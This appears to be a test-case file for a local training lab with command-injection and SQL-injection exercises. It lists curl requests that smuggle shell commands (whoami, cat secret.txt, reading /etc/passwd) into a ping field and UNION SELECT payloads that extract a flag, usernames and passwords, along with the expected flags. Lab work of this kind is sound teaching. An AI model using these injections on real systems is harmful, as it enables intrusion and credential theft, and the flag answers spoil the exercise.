# 🧪 Test Cases - Security Lab

## ✅ Test Lab Command Injection

### Test 1: Ping bình thường
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8"}'
```

**Kết quả mong đợi:** Hiển thị kết quả ping

### Test 2: Whoami
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; whoami"}'
```

**Kết quả mong đợi:** Hiển thị username

### Test 3: List files
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; ls -la"}'
```

**Kết quả mong đợi:** Danh sách file

### Test 4: Get FLAG
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; cat secret.txt"}' | jq -r '.output'
```

**Kết quả mong đợi:** `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`

### Test 5: Multiple commands
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; whoami && pwd && date"}'
```

### Test 6: Read /etc/passwd
```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; head -5 /etc/passwd"}'
```

## ✅ Test Lab SQL Injection

### Test 1: Search bình thường
```bash
curl "http://localhost:3000/api/search?q=SQL"
```

### Test 2: Phát hiện lỗ hổng
```bash
curl "http://localhost:3000/api/search?q=%27"
```

**Kết quả mong đợi:** Lỗi SQL syntax

### Test 3: Union select
```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%201,2--"
```

### Test 4: Get FLAG
```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20id,%20flag%20FROM%20secret--" | jq -r '.results[] | select(.title | contains("FLAG"))'
```

**Kết quả mong đợi:** `FLAG{SQL_1nj3ct10n_M4st3r}`

### Test 5: Get users
```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20username,%20password%20FROM%20users--"
```

### Test 6: List tables
```bash
curl "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%201,%20name%20FROM%20sqlite_master%20WHERE%20type=%27table%27--"
```

## 🌐 Test Frontend

### Test trang chủ
```bash
curl -s http://localhost:3000 | grep -o "SQL Injection\|Command Injection" | head -2
```

### Test lab SQL Injection
```bash
curl -s http://localhost:3000/lab/sqli | grep -o "SQL Injection Lab"
```

### Test lab Command Injection
```bash
curl -s http://localhost:3000/lab/cmdi | grep -o "Command Injection Lab"
```

## 📊 Kết quả Test

Chạy tất cả test:
```bash
bash -c '
echo "=== SECURITY LAB TEST SUITE ==="
echo ""
echo "Test 1: SQL Injection - Get FLAG"
curl -s "http://localhost:3000/api/search?q=%27%20UNION%20SELECT%20id,%20flag%20FROM%20secret--" | jq -r ".results[] | select(.title | contains(\"FLAG\")) | .title"
echo ""
echo "Test 2: Command Injection - Get FLAG"  
curl -s -X POST http://localhost:3000/api/ping -H "Content-Type: application/json" -d "{\"ip\":\"8.8.8.8; cat secret.txt\"}" | jq -r ".output" | grep "FLAG"
echo ""
echo "=== ALL TESTS PASSED ==="
'
```

## 🎯 Expected Results

### SQL Injection FLAG
```
FLAG{SQL_1nj3ct10n_M4st3r}
```

### Command Injection FLAG
```
FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
```
